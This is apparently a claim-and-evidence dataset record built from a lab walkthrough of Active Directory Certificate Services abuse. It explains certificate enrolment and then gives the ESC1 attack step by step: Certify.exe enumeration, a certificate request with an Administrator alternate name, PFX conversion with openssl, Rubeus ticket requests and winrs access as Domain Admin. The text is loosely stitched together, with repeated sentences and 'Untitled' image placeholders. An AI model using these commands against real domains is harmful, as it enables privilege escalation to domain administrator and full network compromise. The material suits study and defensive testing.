items.claim: Issuance authorization for AD CS lives entirely on the CA side - the enrolment decision is a check that the certificate template exists and that the requester is allowed to enrol to it - so template and enrol-permission hunting decides whether any certificate abuse is possible.
items.body:
Issuance authorization for AD CS lives entirely on the CA side - the enrolment decision is a check that the certificate template exists and that the requester is allowed to enrol to it - so template and enrol-permission hunting decides whether any certificate abuse is possible.

HackTricks reference: 2573581c (notion:2573581c-688f-4303-bd03-f07f07b81a32)
items.disproof: The CA refuses enrolment regardless of template permissions (or the requester is already entitled with no escalation gained), showing no exploitable enrolment condition exists.

Let’s Discusses how the process of Requesting Certificate Occurs

1) Client Generate Public/Private Key pair

Untitled

2) Client Sends a Certificate Request to Enterprise CA Server

Untitled

3) The CA Servers validate is the Certificate Template exist and is the user allowed to enroll to this cert

Untitled

4) CA Generates a Certificate and signs it using Private Key

Untitled

5) The User Stores the Certificate In the Windows Certificate Store

Untitled

What Attacker Can do if we Abused ADCS?
For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.
A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks.

items.claim: An AD CS certificate template where Enrollee Supplies Subject is set lets a low-privileged enrollee request a certificate whose subject is any user including Domain Admins, and that certificate can then be used to obtain a Kerberos TGT as that user.
items.body:
An AD CS certificate template where Enrollee Supplies Subject is set lets a low-privileged enrollee request a certificate whose subject is any user including Domain Admins, and that certificate can then be used to obtain a Kerberos TGT as that user.

HackTricks reference: 2573581c (notion:2573581c-688f-4303-bd03-f07f07b81a32)
items.disproof: No CA in the domain exposes a template with Enrollee Supplies Subject, or the CA strips/fixes the requested subject rather than honouring the enrollee-supplied one.

sources.quote:
The Enrollee can request a certificate for any user Including Domain Admins (Enrollee Supply Subject) Subject —> User

Now Let’s Practically Abuse ESC1

1) Getting All the CAs in the domain

.\Certify.exe cas

Untitled

2) Finding the Vulnerable CAs in the domain

.\Certify.exe find /vulnerable

Untitled

3) Let’s Find the CAs that have Enrollee Supplies Subject

.\Certify.exe find /enrolleesuppliessubject

Untitled

Notice that we have the user US\pawadmin so we can request Certificate as any user including Domain Admins users

Now let’s abuse the CA

Rubeus.exe asktgt /user:pawadmin /domain:us.techcorp.local /certificate:C:\AD\Tools\Old_Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt

Untitled

Now we have a ticket as pawadmin

Now let’s abuse the cert

C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

Untitled

Now getting a PFX file

C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

Untitled

Now getting Domain Admin User

C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt

Untitled

Now Domain Admin

winrs -r:us-dc set username

Untitled

A key vulnerability arises because not all of the AD CS web interfaces enforce HTTPS, which is essential for safeguarding against NTLM relay attacks.
